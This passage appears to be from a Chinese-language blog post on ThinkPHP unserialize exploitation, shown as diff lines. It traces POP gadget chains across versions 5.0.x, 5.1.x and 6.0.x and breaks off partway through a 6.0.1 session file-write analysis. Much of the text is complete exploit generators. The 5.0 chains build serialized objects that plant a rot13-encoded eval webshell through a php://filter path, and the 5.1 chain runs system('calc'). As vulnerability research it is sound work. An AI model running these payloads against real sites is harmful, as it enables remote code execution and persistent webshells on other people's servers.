+<p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230706093127919.png" alt="image-20230706093127919"></p>
+<p>这里使用的是<code>process/pipes/Windows.php的__destruct()</code>，它调用了自己的<code>removeFiles()</code>方法</p>
+<p>查看这个方法</p>
+<pre><code class="php">private function removeFiles()
+    &#123;
+        foreach ($this-&gt;files as $filename) &#123;
+            if (file_exists($filename)) &#123;
+                @unlink($filename);
+            &#125;
+        &#125;
+        $this-&gt;files = [];
+    &#125;
+</code></pre>
+<p>这个$this-&gt;files是可以控制的，经过<code>file_exists($filename)</code>可以触发<code>__tostring()</code>，这里存在一个任意文删除</p>
+<p>全局搜索__tostring()</p>
+<p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230706094845102.png" alt="image-20230706094845102"></p>
+<p>这里选择的是Model.php里面的<code>__tostring</code>方法</p>
+<p>跟进其调用的<code>toJson()</code></p>
+<pre><code class="php">public function toJson($options = JSON_UNESCAPED_UNICODE)
+    &#123;
+        return json_encode($this-&gt;toArray(), $options);
+    &#125;
+</code></pre>
+<p>继续跟进<code>$this-&gt;toArray()</code>,发现这里的可控参数比较多 （这部分有点懵逼）</p>
+<p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230706100617880.png" alt="image-20230706100617880"></p>
+<p>这里可以找到一个触发<code>__call</code>的地方</p>
+<p>此时，需要控制<code>$value</code>为一个带有<code>__call</code>的类对象，往上查找，$value是来自这</p>
+<p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230706101439978.png" alt="image-20230706101439978"></p>
+<p>其中，参数 <code>$modelRelation = $this-&gt;$relation()</code> ，实际上就是 <code>think\Model</code> 类任意方法的返回结果。这里选择返回结果简单可控的 <code>getError</code> 方法</p>
+<pre><code class="php">public function getError()
+&#123;
+    return $this-&gt;error;
+&#125;
+</code></pre>
+<p>在getRelationData方法里，要进入第一个if语句才能赋值成想要的类</p>
+<p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230706104144796.png" alt="image-20230706104144796"></p>
+<p>层层分析，要满足</p>
+<pre><code>$this-&gt;append = [&#39;getError&#39;];
+$this-&gt;error = new HasOne();//Relation子类,且有getBindAttr()
+$this-&gt;selfRelation = false;//isSelfRelation()
+$this-&gt;query = new Query();
+$this-&gt;parent = new xxx()  //调用__call
+</code></pre>
+<p>全局搜索__call</p>
+<p>这里选择的是console&#x2F;Output.php的Output类</p>
+<p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230706105401777.png" alt="image-20230706105401777"></p>
+<pre><code class="php">public function __call($method, $args)
+    &#123;
+        if (in_array($method, $this-&gt;styles)) &#123;
+            array_unshift($args, $method);
+            return call_user_func_array([$this, &#39;block&#39;], $args);
+        &#125;
+
+        if ($this-&gt;handle &amp;&amp; method_exists($this-&gt;handle, $method)) &#123;
+            return call_user_func_array([$this-&gt;handle, $method], $args);
+        &#125; else &#123;
+            throw new Exception(&#39;method not exists:&#39; . __CLASS__ . &#39;-&gt;&#39; . $method);
+        &#125;
+    &#125;
+</code></pre>
+<p>这个方法调用了<code>call_user_func_array</code>把第一个参数作为回调函数（<strong>callback</strong>）调用，把参数数组作（<strong>param_arr</strong>）为回调函数的的参数传入</p>
+<p>在第一个call_user_func_array中调用了block方法</p>
+<pre><code class="php">protected function block($style, $message)
+    &#123;
+        $this-&gt;writeln(&quot;&lt;&#123;$style&#125;&gt;&#123;$message&#125;&lt;/$style&gt;&quot;);
+    &#125;
+</code></pre>
+<p>继续跟进writeln</p>
+<pre><code class="php">public function writeln($messages, $type = self::OUTPUT_NORMAL)
+    &#123;
+        $this-&gt;write($messages, true, $type);
+    &#125;
+</code></pre>
+<p>继续跟进write</p>
+<pre><code class="php">public function write($messages, $newline = false, $type = self::OUTPUT_NORMAL)
+&#123;
+    $this-&gt;handle-&gt;write($messages, $newline, $type);
+&#125;
+</code></pre>
+<p>$this-&gt;handle可控，可以修改为某个类，执行这个类的write</p>
+<p>全局搜索 <code>write</code> 方法进一步利用，跟进 <code>thinkphp/library/think/session/driver/Memcached.php</code></p>
+<pre><code class="php">public function write($sessID, $sessData)
+&#123;
+    return $this-&gt;handler-&gt;set($this-&gt;config[&#39;session_name&#39;] . $sessID, $sessData, $this-&gt;config[&#39;expire&#39;]);
+&#125;
+</code></pre>
+<p>这个$this-&gt;handle也是可控的，</p>
+<p>全局搜索<code>set</code>方法,找到<code>thinkphp/library/think/cache/driver/File.php</code></p>
+<pre><code class="php">public function set($name, $value, $expire = null)
+    &#123;
+        if (is_null($expire)) &#123;
+            $expire = $this-&gt;options[&#39;expire&#39;];
+        &#125;
+        if ($expire instanceof \DateTime) &#123;
+            $expire = $expire-&gt;getTimestamp() - time();
+        &#125;
+        $filename = $this-&gt;getCacheKey($name, true);
+        if ($this-&gt;tag &amp;&amp; !is_file($filename)) &#123;
+            $first = true;
+        &#125;
+        $data = serialize($value);
+        if ($this-&gt;options[&#39;data_compress&#39;] &amp;&amp; function_exists(&#39;gzcompress&#39;)) &#123;
+            //数据压缩
+            $data = gzcompress($data, 3);
+        &#125;
+        $data   = &quot;&lt;?php\n//&quot; . sprintf(&#39;%012d&#39;, $expire) . &quot;\n exit();?&gt;\n&quot; . $data;
+        $result = file_put_contents($filename, $data);
+        if ($result) &#123;
+            isset($first) &amp;&amp; $this-&gt;setTagItem($filename);
+            clearstatcache();
+            return true;
+        &#125; else &#123;
+            return false;
+        &#125;
+    &#125;
+</code></pre>
+<p>这里存在一个php文件写入，虽然前面有<code>exit()</code>避免后面的数据被执行，但是这里可以使用伪协议绕过</p>
+<p>这里存在一个问题，只能控制文件名，写入为文件的数据来自<code>$value</code>, 根据链子传参，$value&#x3D; true ，是不可控的</p>
+<p>而且在windows环境下，文件名存在限制</p>
+<p>往下存在setTagItem调用，传参是文件名</p>
+<p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230706115302269.png" alt="image-20230706115302269"></p>
+<p>跟进查看：</p>
+<pre><code class="php">protected function setTagItem($name)
+    &#123;
+        if ($this-&gt;tag) &#123;
+            $key       = &#39;tag_&#39; . md5($this-&gt;tag);
+            $this-&gt;tag = null;
+            if ($this-&gt;has($key)) &#123;
+                $value   = explode(&#39;,&#39;, $this-&gt;get($key));
+                $value[] = $name;
+                $value   = implode(&#39;,&#39;, array_unique($value));
+            &#125; else &#123;
+                $value = $name;
+            &#125;
+            $this-&gt;set($key, $value, 0);
+        &#125;
+    &#125;
+</code></pre>
+<p>这个函数会再次调用set()方法，并且set方法的value是来自文件名$name,也就是说可以把前面的文件名写入到文件里</p>
+<p>如果第一次调用set方法的时候把恶意代码写到文件名里，第二此调用set的时候就能够把文件名的内容写入到新的php文件里</p>
+<p>最终POP链：</p>
+<pre><code class="php">&lt;?php
+namespace think\process\pipes;
+use think\model\Pivot;
+class Pipes&#123;
+
+&#125;
+
+class Windows extends Pipes&#123;
+    private $files = [];
+
+    function __construct()&#123;
+        $this-&gt;files = [new Pivot()];
+    &#125;
+&#125;
+
+namespace think\model;#Relation
+use think\db\Query;
+abstract class Relation&#123;
+    protected $selfRelation;
+    protected $query;
+    function __construct()&#123;
+        $this-&gt;selfRelation = false;
+        $this-&gt;query = new Query();#class Query
+    &#125;
+&#125;
+
+namespace think\model\relation;#OneToOne HasOne
+use think\model\Relation;
+abstract class OneToOne extends Relation&#123;
+    function __construct()&#123;
+        parent::__construct();
+    &#125;
+
+&#125;
+class HasOne extends OneToOne&#123;
+    protected $bindAttr = [];
+    function __construct()&#123;
+        parent::__construct();
+        $this-&gt;bindAttr = [&quot;no&quot;,&quot;123&quot;];
+    &#125;
+&#125;
+
+namespace think\console;#Output
+use think\session\driver\Memcached;
+class Output&#123;
+    private $handle = null;
+    protected $styles = [];
+    function __construct()&#123;
+        $this-&gt;handle = new Memcached();//目的调用其write()
+        $this-&gt;styles = [&#39;getAttr&#39;];
+    &#125;
+&#125;
+
+namespace think;#Model
+use think\model\relation\HasOne;
+use think\console\Output;
+use think\db\Query;
+abstract class Model&#123;
+    protected $append = [];
+    protected $error;
+    public $parent;#修改处
+    protected $selfRelation;
+    protected $query;
+    protected $aaaaa;
+
+    function __construct()&#123;
+        $this-&gt;parent = new Output();#Output对象,目的是调用__call()
+        $this-&gt;append = [&#39;getError&#39;];
+        $this-&gt;error = new HasOne();//Relation子类,且有getBindAttr()
+        $this-&gt;selfRelation = false;//isSelfRelation()
+        $this-&gt;query = new Query();
+
+    &#125;
+&#125;
+
+namespace think\db;#Query
+use think\console\Output;
+class Query&#123;
+    protected $model;
+    function __construct()&#123;
+        $this-&gt;model = new Output();
+    &#125;
+&#125;
+
+namespace think\session\driver;#Memcached
+use think\cache\driver\File;
+class Memcached&#123;
+    protected $handler = null;
+    function __construct()&#123;
+        $this-&gt;handler = new File();//目的调用File-&gt;set()
+    &#125;
+&#125;
+namespace think\cache\driver;#File
+class File&#123;
+    protected $options = [];
+    protected $tag;
+    function __construct()&#123;
+        $this-&gt;options = [
+            &#39;expire&#39;        =&gt; 0,
+            &#39;cache_subdir&#39;  =&gt; false,
+            &#39;prefix&#39;        =&gt; &#39;&#39;,
+            &#39;path&#39;          =&gt; &#39;php://filter/write=string.rot13/resource=./&lt;?cuc cucvasb();riny($_TRG[q1ab])?&gt;&#39;,
+            &#39;data_compress&#39; =&gt; false,
+        ];
+        $this-&gt;tag = true;
+    &#125;
+&#125;
+
+namespace think\model;
+use think\Model;
+class Pivot extends Model&#123;
+
+&#125;
+
+
+use think\process\pipes\Windows;
+echo urlencode(serialize(new Windows()));
+</code></pre>
+<h5 id="低版本-（5-0-3）"><a href="#低版本-（5-0-3）" class="headerlink" title="低版本 （5.0.3）"></a>低版本 （5.0.3）</h5><p>控制器</p>
+<pre><code class="php">&lt;?php
+namespace app\index\controller;
+class Index
+&#123;
+    public function index()
+    &#123;
+        $c = unserialize($_GET[&#39;c&#39;]);
+        var_dump($c);
+        return &#39;Welcome to thinkphp&#39;;
+    &#125;
+&#125;
+</code></pre>
+<p>因为低版本的toArray()函数和高版本的有所不同，不存在调用__call()的条件，所以需要重新找一条链子</p>
+<p>从<code>__destruct</code>开始找,除了<code>process/pipes/Windows.php</code>外还有3个可以选,但是只有一条是可利用的   <code>Process.php</code></p>
+<p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230706144327242.png" alt="image-20230706144327242"></p>
+<p>这里调用了<code>stop()</code>方法,跟进查看</p>
+<pre><code class="php">public function stop()
+    &#123;
+        if ($this-&gt;isRunning()) &#123;
+            if (&#39;\\&#39; === DS &amp;&amp; !$this-&gt;isSigchildEnabled()) &#123;
+                exec(sprintf(&#39;taskkill /F /T /PID %d 2&gt;&amp;1&#39;, $this-&gt;getPid()), $output, $exitCode);
+                if ($exitCode &gt; 0) &#123;
+                    throw new \RuntimeException(&#39;Unable to kill the process&#39;);
+                &#125;
+            &#125; else &#123;
+                $pids = preg_split(&#39;/\s+/&#39;, `ps -o pid --no-heading --ppid &#123;$this-&gt;getPid()&#125;`);
+                foreach ($pids as $pid) &#123;
+                    if (is_numeric($pid)) &#123;
+                        posix_kill($pid, 9);
+                    &#125;
+                &#125;
+            &#125;
+        &#125;
+
+        $this-&gt;updateStatus(false);
+        if ($this-&gt;processInformation[&#39;running&#39;]) &#123;
+            $this-&gt;close();
+        &#125;
+
+        return $this-&gt;exitcode;
+    &#125;
+</code></pre>
+<p>跟进<code>isRunning()</code></p>
+<pre><code class="php">public function isRunning()
+    &#123;
+        if (self::STATUS_STARTED !== $this-&gt;status) &#123;
+            return false;
+        &#125;
+
+        $this-&gt;updateStatus(false);
+
+        return $this-&gt;processInformation[&#39;running&#39;];
+    &#125;
+</code></pre>
+<p>里面会调用一个updateStatus方法，并且$this-&gt;status可控，可以让程序走到这</p>
+<p>跟进查看</p>
+<pre><code class="php">    protected function updateStatus($blocking)
+    &#123;
+        if (self::STATUS_STARTED !== $this-&gt;status) &#123;
+            return;
+        &#125;
+
+        $this-&gt;processInformation = proc_get_status($this-&gt;process);
+        $this-&gt;captureExitCode();
+
+        $this-&gt;readPipes($blocking, &#39;\\&#39; === DS ? !$this-&gt;processInformation[&#39;running&#39;] : true);
+
+        if (!$this-&gt;processInformation[&#39;running&#39;]) &#123;
+            $this-&gt;close();
+        &#125;
+    &#125;
+</code></pre>
+<p>后面的$this-&gt;close()是可以利用的，第一行就可以触发__call</p>
+<p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230706150633080.png" alt="image-20230706150633080"></p>
+<p>但是程序走不到这里，当运行<code>proc_get_status</code>的时候就会报错退出了</p>
+<p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230706150555278.png" alt="image-20230706150555278"></p>
+<p>这里的close()是不能利用了</p>
+<p>在上面的 stop()方法中，后面就自带了 <code>close（）</code>,利用这个就行,只需：</p>
+<pre><code class="php">$this-&gt;processInformation[&#39;running&#39;]=true;
+$this-&gt;status=3;//只有不相等就行
+</code></pre>
+<p>跟进<code>close()</code></p>
+<p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230706152017394.png" alt="image-20230706152017394"></p>
+<p>这里触发__call(),需要控制<code>$this-&gt;processPipes</code></p>
+<p>尝试直接触发think\console\Output类中的__call魔术方法。由于block方法需要2个参数</p>
+<p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230706153015240.png" alt="image-20230706153015240"></p>
+<p>需要找到另外一个__call方法</p>
+<p>最终找到<code>model/Relation.php</code>这个文件下的__call</p>
+<pre><code class="php">public function __call($method, $args)
+    &#123;
+        if ($this-&gt;query) &#123;
+            switch ($this-&gt;type) &#123;
+                case self::HAS_MANY:
+                    if (isset($this-&gt;where)) &#123;
+                        $this-&gt;query-&gt;where($this-&gt;where);
+                    &#125; elseif (isset($this-&gt;parent-&gt;&#123;$this-&gt;localKey&#125;)) &#123;
+                        // 关联查询带入关联条件
+                        $this-&gt;query-&gt;where($this-&gt;foreignKey, $this-&gt;parent-&gt;&#123;$this-&gt;localKey&#125;);
+                    &#125;
+                    break;
+                case self::HAS_MANY_THROUGH:
+                    $through      = $this-&gt;middle;
+                    $model        = $this-&gt;model;
+                    $alias        = Loader::parseName(basename(str_replace(&#39;\\&#39;, &#39;/&#39;, $model)));
+                    $throughTable = $through::getTable();
+                    $pk           = (new $this-&gt;model)-&gt;getPk();
+                    $throughKey   = $this-&gt;throughKey;
+                    $modelTable   = $this-&gt;parent-&gt;getTable();
+                    $this-&gt;query-&gt;field($alias . &#39;.*&#39;)-&gt;alias($alias)
+                        -&gt;join($throughTable, $throughTable . &#39;.&#39; . $pk . &#39;=&#39; . $alias . &#39;.&#39; . $throughKey)
+                        -&gt;join($modelTable, $modelTable . &#39;.&#39; . $this-&gt;localKey . &#39;=&#39; . $throughTable . &#39;.&#39; . $this-&gt;foreignKey)
+                        -&gt;where($throughTable . &#39;.&#39; . $this-&gt;foreignKey, $this-&gt;parent-&gt;&#123;$this-&gt;localKey&#125;);
+                    break;
+                case self::BELONGS_TO_MANY:
+                    // TODO
+
+            &#125;
+            $result = call_user_func_array([$this-&gt;query, $method], $args);
+            if ($result instanceof \think\db\Query) &#123;
+                $this-&gt;option = $result-&gt;getOptions();
+                return $this;
+            &#125; else &#123;
+                $this-&gt;option = [];
+                return $result;
+            &#125;
+        &#125; else &#123;
+            throw new Exception(&#39;method not exists:&#39; . __CLASS__ . &#39;-&gt;&#39; . $method);
+        &#125;
+    &#125;
+</code></pre>
+<p>这个__call就非常的好用，query和type和where都可以控制</p>
+<p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230706155221160.png" alt="image-20230706155221160"></p>
+<p>这里就可以构造，调用上面Output类的__call()方法了</p>
+<pre><code class="php">class Relation
+&#123;
+    protected $query;
+    const HAS_ONE          = 1;
+    const HAS_MANY         = 2;
+    const HAS_MANY_THROUGH = 5;
+    const BELONGS_TO       = 3;
+    const BELONGS_TO_MANY  = 4;
+    protected $type=2;
+    protected $where=1;
+    public function __construct()
+    &#123;
+        $this-&gt;query=new Output();
+    &#125;
+&#125;
+</code></pre>
+<p>跟进<code>Output</code>中的<code>__call</code></p>
+<p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230706163554437.png" alt="image-20230706163554437"></p>
+<p>进行跟进</p>
+<pre><code>__call--&gt;block--&gt;writeln--&gt;write--&gt;
+</code></pre>
+<pre><code class="php">public function write($messages, $newline = false, $type = self::OUTPUT_NORMAL)
+    &#123;
+        $this-&gt;handle-&gt;write($messages, $newline, $type);
+    &#125;
+</code></pre>
+<p>通过这里可以调用任意类的write方法，</p>
+<p>这里找到两个一样的，都调用了set方法</p>
+<pre><code class="php">//session/driver/Memcache.php
+public function write($sessID, $sessData)
+    &#123;
+        return $this-&gt;handler-&gt;set($this-&gt;config[&#39;session_name&#39;] . $sessID, $sessData, 0, $this-&gt;config[&#39;expire&#39;]);
+    &#125;
+</code></pre>
+<pre><code class="php">//session/driver/Memcached.php
+public function write($sessID, $sessData)
+    &#123;
+        return $this-&gt;handler-&gt;set($this-&gt;config[&#39;session_name&#39;] . $sessID, $sessData, $this-&gt;config[&#39;expire&#39;]);
+    &#125;
+</code></pre>
+<p>最后选择了<code>session/driver/Memcached.php</code></p>
+<p>全局搜索set方法，和高版本的一样，使用cache&#x2F;driver&#x2F;File.php这里的set,</p>
+<p>后面的操作是和高版本的相同的，调用了两次set方法，然后第二次调用的时候吧恶意代码存进php文件里</p>
+<p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230706171130685.png" alt="image-20230706171130685"></p>
+<p>注意：因为windows对文件名存在限制，这个pop链只能在linux环境使用</p>
+<pre><code class="php">&lt;?php
+namespace think;
+
+
+class Process
+&#123;
+    private $processPipes;
+
+    private $status;
+
+    private $processInformation;
+    public function  __construct()&#123;
+        $this-&gt;processInformation[&#39;running&#39;]=true;
+        $this-&gt;status=3;
+        $this-&gt;processPipes=new \think\model\Relation();
+    &#125;
+
+&#125;
+namespace think\model;
+
+use think\console\Output;
+
+class Relation
+&#123;
+    protected $query;
+    const HAS_ONE          = 1;
+    const HAS_MANY         = 2;
+    const HAS_MANY_THROUGH = 5;
+    const BELONGS_TO       = 3;
+    const BELONGS_TO_MANY  = 4;
+    protected $type=2;
+    protected $where=1;
+    public function __construct()
+    &#123;
+        $this-&gt;query=new Output();
+    &#125;
+&#125;
+
+
+namespace think\console;
+use think\session\driver\Memcached;
+class Output&#123;
+    protected $styles = [
+        &#39;info&#39;,
+        &#39;error&#39;,
+        &#39;comment&#39;,
+        &#39;question&#39;,
+        &#39;highlight&#39;,
+        &#39;warning&#39;,
+        &#39;getTable&#39;,
+        &#39;where&#39;
+    ];
+    private $handle;
+    public function __construct()
+    &#123;
+//        $this-&gt;handle = (new \think\session\driver\Memcache);
+        $this-&gt;handle = new Memcached();//目的调用其write()
+//        $this-&gt;styles = [&#39;getAttr&#39;];
+    &#125;
+&#125;
+
+
+namespace think\session\driver;#Memcached
+use think\cache\driver\File;
+class Memcached&#123;
+    protected $tag;
+    protected $handler;
+
+    public function __construct()
+    &#123;
+        $this-&gt;tag = true;
+   
+        $this-&gt;handler = (new File);
+    &#125;
+&#125;
+
+namespace think\cache\driver;
+use think\cache\Driver;
+class File extends Driver
+&#123;
+    protected $tag;
+    protected $options;
+    public function __construct()
+    &#123;
+        $this-&gt;tag = false;
+        $this-&gt;options = [
+            &#39;expire&#39;        =&gt; 0,
+            &#39;cache_subdir&#39;  =&gt; false,
+            &#39;prefix&#39;        =&gt; &#39;&#39;,
+            &#39;path&#39;          =&gt; &#39;php://filter/write=string.rot13/resource=./&lt;?cuc cucvasb();riny($_TRG[q1ab])?&gt;&#39;,
+            &#39;data_compress&#39; =&gt; false,
+        ];
+        $this-&gt;tag = true;
+    &#125;
+&#125;
+
+namespace think\cache;
+abstract class Driver
+&#123;
+
+&#125;
+
+
+use think\Process;
+$a=new Process();
+echo urlencode(serialize($a));
+</code></pre>
+<h4 id="5-1-x"><a href="#5-1-x" class="headerlink" title="5.1.x"></a>5.1.x</h4><p>5.1.30</p>
+<pre><code class="php">public function index()
+    &#123;
+        $c = unserialize($_GET[&#39;c&#39;]);
+        var_dump($c);
+        return &#39;Welcome to thinkphp&#39;;
+    &#125;
+</code></pre>
+<p>全局搜索__destruct ， 这里使用的是think&#x2F;process&#x2F;pipes&#x2F;Windows.php的</p>
+<pre><code class="php">public function __destruct()
+    &#123;
+        $this-&gt;close();
+        $this-&gt;removeFiles();
+    &#125;
+</code></pre>
+<p>跟进<code>removeFiles()</code></p>
+<pre><code class="php">private function removeFiles()
+    &#123;
+        foreach ($this-&gt;files as $filename) &#123;
+            if (file_exists($filename)) &#123;
+                @unlink($filename);
+            &#125;
+        &#125;
+        $this-&gt;files = [];
+    &#125;
+</code></pre>
+<p>这里存在一个任意文删除，因为$this-&gt;files可控，还可以触发<code>__toString</code></p>
+<p>全局搜索<code>__toString</code> </p>
+<p>存在13个结果，但是这里使用的是<code>think/model/concern/Conversion.php</code>的<code>__toString </code>方法</p>
+<pre><code class="php">public function __toString()
+    &#123;
+        return $this-&gt;toJson();
+    &#125;
+</code></pre>
+<p>到这里先构造部分POP链</p>
+<pre><code class="php">namespace think\process\pipes;
+use think\model\concern\Conversion;
+class Windows extends Pipes
+&#123;
+    private $files=[];
+    public function __construct()
+    &#123;
+        $this-&gt;files=[xxx];//
+    &#125;
+&#125;
+
+use think\process\pipes\Windows;
+echo urlencode(serialize(new Windows()));
+</code></pre>
+<p>这里的xxx是只向<code>Conversion.php</code>的<code>__toString </code>方法所在的类<code>Conversion</code></p>
+<p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230706194702593.png" alt="image-20230706194702593"></p>
+<p>由于<code>convertion</code>是<code>trait</code>类，Trait是一种代码复用机制，它允许在不同类之间共享方法的代码块</p>
+<p>所以只要找到一个使用了conversion的类即可，全局搜索conversion只找到Model类</p>
+<p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230706194922743.png" alt="image-20230706194922743"></p>
+<p>由于Model是抽象类，我们得找到<code>Model</code>的实现类，全局搜索<code>extends Model</code>找到<code>Pivot</code></p>
+<p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230706195420277.png" alt="image-20230706195420277"></p>
+<p>所以exp要这样写</p>
+<pre><code class="php">namespace think\process\pipes;
+abstract class Pipes
+&#123;
+
+&#125;
+
+namespace think\process\pipes;
+use think\model\Pivot;
+class Windows extends Pipes
+&#123;
+    private $files=[];
+    public function __construct()
+    &#123;
+        $this-&gt;files=[new Pivot()];
+    &#125;
+&#125;
+
+namespace think;
+
+abstract class Model
+&#123;
+
+&#125;
+
+namespace think\model;
+use think\Model;
+class Pivot extends Model
+&#123;
+
+&#125;
+
+use think\process\pipes\Windows;
+echo urlencode(serialize(new Windows()));
+</code></pre>
+<p>回到<code>__toString</code>跟进这个<code>toJson()</code>方法</p>
+<pre><code class="php">public function toJson($options = JSON_UNESCAPED_UNICODE)
+    &#123;
+        return json_encode($this-&gt;toArray(), $options);
+    &#125;
+</code></pre>
+<p>跟进<code>toArray()</code></p>
+<p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230706204511419.png" alt="image-20230706204511419"></p>
+<p>在这里可以看到有许多参数都是可控的，例如$this-&gt;data，$this-&gt;relation，$this-&gt;visible，$this-&gt;append</p>
+<p>这里能够使用的是<code>getAttr()</code>方法</p>
+<p>先查看这个方法：</p>
+<p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230706211615736.png" alt="image-20230706211615736"></p>
+<p>这个$closure是可控的，可以用来调用任意函数，其参数$value,是由上一层传来的参数控制，也可控</p>
+<p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230706211900803.png" alt="image-20230706211900803"></p>
+<p>这个$key来自<code>$this-&gt;data</code>,</p>
+<p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230706212008652.png" alt="image-20230706212008652"></p>
+<p>所以只是需要如下构造，即可实现system(‘calc’)</p>
+<pre><code class="php">protected $append = [&#39;a&#39;=&gt;[]];
+    private $withAttr = [];
+    private $data = [];
+
+    public function __construct($data = [])
+    &#123;
+        $this-&gt;withAttr=[&#39;b&#39;=&gt;&#39;system&#39;];
+        $this-&gt;data=[&#39;b&#39;=&gt;&#39;calc&#39;];
+    &#125;
+</code></pre>
+<p>最终的调用栈</p>
+<pre><code>Attribute.php:511, think\Model-&gt;getAttr()
+Conversion.php:161, think\Model-&gt;toArray()
+Conversion.php:209, think\Model-&gt;toJson()
+Conversion.php:225, think\Model-&gt;__toString()
+Windows.php:163, file_exists()
+Windows.php:163, think\process\pipes\Windows-&gt;removeFiles()
+Windows.php:59, think\process\pipes\Windows-&gt;__destruct()
+Container.php:395, app\index\controller\Index-&gt;index()
+Container.php:395, ReflectionMethod-&gt;invokeArgs()
+Container.php:395, think\Container-&gt;invokeReflectMethod()
+Module.php:135, think\route\dispatch\Module-&gt;think\route\dispatch\&#123;closure&#125;()
+Middleware.php:185, call_user_func_array:&#123;D:\phpstudy_pro\WWW\thinkphp-5.1.30\thinkphp\library\think\Middleware.php:185&#125;()
+Middleware.php:185, think\Middleware-&gt;think\&#123;closure&#125;()
+Middleware.php:130, call_user_func:&#123;D:\phpstudy_pro\WWW\thinkphp-5.1.30\thinkphp\library\think\Middleware.php:130&#125;()
+Middleware.php:130, think\Middleware-&gt;dispatch()
+Module.php:140, think\route\dispatch\Module-&gt;exec()
+Dispatch.php:168, think\route\Dispatch-&gt;run()
+App.php:432, think\App-&gt;think\&#123;closure&#125;()
+Middleware.php:185, call_user_func_array:&#123;D:\phpstudy_pro\WWW\thinkphp-5.1.30\thinkphp\library\think\Middleware.php:185&#125;()
+Middleware.php:185, think\Middleware-&gt;think\&#123;closure&#125;()
+Middleware.php:130, call_user_func:&#123;D:\phpstudy_pro\WWW\thinkphp-5.1.30\thinkphp\library\think\Middleware.php:130&#125;()
+Middleware.php:130, think\Middleware-&gt;dispatch()
+App.php:435, think\App-&gt;run()
+index.php:21, &#123;main&#125;()
+</code></pre>
+<p>POP链</p>
+<pre><code class="php">&lt;?php
+
+namespace think\process\pipes;
+abstract class Pipes
+&#123;
+
+&#125;
+
+
+namespace think\process\pipes;
+use think\model\Pivot;
+class Windows extends Pipes
+&#123;
+    private $files=[];
+    public function __construct()
+    &#123;
+        $this-&gt;files=[new Pivot()];
+    &#125;
+&#125;
+
+
+namespace think;
+
+abstract class Model
+&#123;
+    protected $append = [&#39;a&#39;=&gt;[]];
+    private $withAttr = [];
+    private $data = [];
+
+    public function __construct($data = [])
+    &#123;
+        $this-&gt;withAttr=[&#39;b&#39;=&gt;&#39;system&#39;];
+        $this-&gt;data=[&#39;b&#39;=&gt;&#39;calc&#39;];
+    &#125;
+&#125;
+
+namespace think\model;
+use think\Model;
+class Pivot extends Model
+&#123;
+
+&#125;
+
+use think\process\pipes\Windows;
+echo urlencode(serialize(new Windows()));
+</code></pre>
+<h4 id="5-2-x"><a href="#5-2-x" class="headerlink" title="5.2.x"></a>5.2.x</h4><p>(无测试环境，暂时PASS)</p>
+<h2 id="ThinkPHP-6-x"><a href="#ThinkPHP-6-x" class="headerlink" title="ThinkPHP 6.x"></a>ThinkPHP 6.x</h2><h3 id="任意文件写（6-0-0，6-0-1）"><a href="#任意文件写（6-0-0，6-0-1）" class="headerlink" title="任意文件写（6.0.0，6.0.1）"></a>任意文件写（6.0.0，6.0.1）</h3><p>环境：tp6.0.1</p>
+<p>控制器：</p>
+<pre><code class="php">&lt;?php
+namespace app\controller;
+
+use app\BaseController;
+
+class Index extends BaseController
+&#123;
+    public function index()
+    &#123;
+        session(&#39;demo&#39;, $_GET[&#39;demo&#39;]);
+        return &#39;ThinkPHP V6.0.1&#39;;
+    &#125;
+
+    public function hello($name = &#39;ThinkPHP6&#39;)
+    &#123;
+        return &#39;hello,&#39; . $name;
+    &#125;
+&#125;
+</code></pre>
+<p>修改 &#x2F;app&#x2F;middleware.php 文件如下,开启Session功能</p>
+<pre><code class="php">&lt;?php
+// 全局中间件定义文件
+return [
+    // 全局请求缓存
+    // \think\middleware\CheckRequestCache::class,
+    // 多语言加载
+    // \think\middleware\LoadLangPack::class,
+    // Session初始化
+     \think\middleware\SessionInit::class
+];
+</code></pre>
+<p>对比6.0.1和6.0.2，官方修改了<code>sessionid</code>的检查,添加了ctype_alnum 函数验证$id只能是字母和数字或字母数字的组合</p>
+<p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230707093621722.png" alt="image-20230707093621722"></p>
+<p>漏洞具体流程如下：</p>
+<pre><code>?demo=AAAAA
+</code></pre>
+<p>当程序初始化的时候，会对seess进行初始化</p>
+<p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230707105459607.png" alt="image-20230707105459607"></p>
+<p>然后会调用<code>getName()</code>获取cookie中<code>PHPSESSID</code>的值，里面调用了setId（）</p>
+<p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230707105829879.png" alt="image-20230707105829879"></p>
+<p>如果不存在PHPSESSID,或者不满足条件，则重新生成一个32位的<code>PHPSESSID</code> , 如果满足条件则不管</p>
+<p>调用栈如下：</p>
+<pre><code class="php">Store.php:121, think\session\Store-&gt;setId()
+Store.php:61, think\session\Store-&gt;__construct()
+Session.php:31, think\Session-&gt;createDriver()
+Manager.php:65, think\Manager-&gt;getDriver()
+Manager.php:55, think\Manager-&gt;driver()
+Manager.php:174, think\Manager-&gt;__call()
+SessionInit.php:50, think\Manager-&gt;getName()
+SessionInit.php:50, think\middleware\SessionInit-&gt;handle()
+Middleware.php:142, call_user_func:&#123;D:\phpstudy_pro\WWW\thinkphp-6.0.1\vendor\topthink\framework\src\think\Middleware.php:142&#125;()
+Middleware.php:142, think\Middleware-&gt;think\&#123;closure:D:\phpstudy_pro\WWW\thinkphp-6.0.1\vendor\topthink\framework\src\think\Middleware.php:137-148&#125;()
